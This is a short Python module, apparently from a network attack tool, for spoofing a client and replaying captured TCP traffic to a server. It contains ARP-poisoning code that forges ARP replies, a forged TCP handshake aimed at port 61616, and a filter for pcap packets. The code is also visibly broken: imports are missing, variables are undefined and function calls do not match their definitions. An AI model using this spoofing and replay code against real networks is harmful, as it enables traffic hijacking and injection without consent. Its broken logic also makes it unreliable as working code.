#!/usr/bin/env python3
import time
from .Client import Client, NetAttrs


def replay_usage(exit_num=None):
    usg = ""
    usg += "Requires: Server/Client IP, PCAP Interface"

    print(usg)


# spoof arp so that other networks recognize spoofed client
def arp_poison(client, server):
    send(ARP(op=2,
             hwsrc=client.mac,
             psrc=client.ip,
             hwdst=server.mac,
             pdst=server.ip),
         iface=intface)


def t_shake(client, server):
    msg = client.gen_msg()

    msg.flags = "S"

    sendp(msg, iface=intface)
    arp_poison()

    t = sniff(iface=intface,
              count=1,
              lfilter=lambda x: x.haslayer(TCP) and x[IP].src == server.ip and
              x[IP].dst == client.ip and x[TCP].flags)[0]

    ACK = TCP(sport=49444,
              dport=61616,
              flags='A',
              seq=t[TCP].ack,
              ack=t[TCP].seq + 1)
    sendp(eth / ip / ACK, iface=intface)


# filter pcap for tcp messages from client and server
def pcap_filter(pcaps, client_ip, server_ip):
    c_msg = []
    s_msg = []

    for packet in pcaps:
        if packet[IP].src == client_ip and packet[IP].dst == server_ip:
            c_msg.append(packet)

        elif packet[IP].src == server_ip and packet[IP].dst == client_ip:
            s_msg.append(packet)

    return (c_msg, s_msg)


def tcp_replay(server, client, pcaps, intface):
    c_msg, s_msg = pcap_filter(pcaps, client.ip, server.ip)

    t_shake(client, server, intface)
